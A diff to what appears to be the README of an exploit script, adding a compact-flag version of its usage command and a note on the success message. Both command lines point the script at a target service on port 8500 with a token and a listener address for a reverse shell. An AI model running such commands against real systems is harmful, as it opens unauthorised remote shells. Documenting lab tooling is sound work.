@@ -16,6 +16,11 @@
     python3 exploit.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.14.10 --lport 443 --token bb03b43b-1d81-d62b-24b5-39540ee469b5
 
 
+· or can be compacted with the other argument options
+
+    python3 exploit.py -rh 127.0.0.1 -rp 8500 -lh 10.10.14.10 -lp 443 -tk bb03b43b-1d81-d62b-24b5-39540ee469b5
+    
+
 · When executing the script with its arguments we should see a message with a + which indicates that the request has been sent correctly
 
 <img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit2.png">
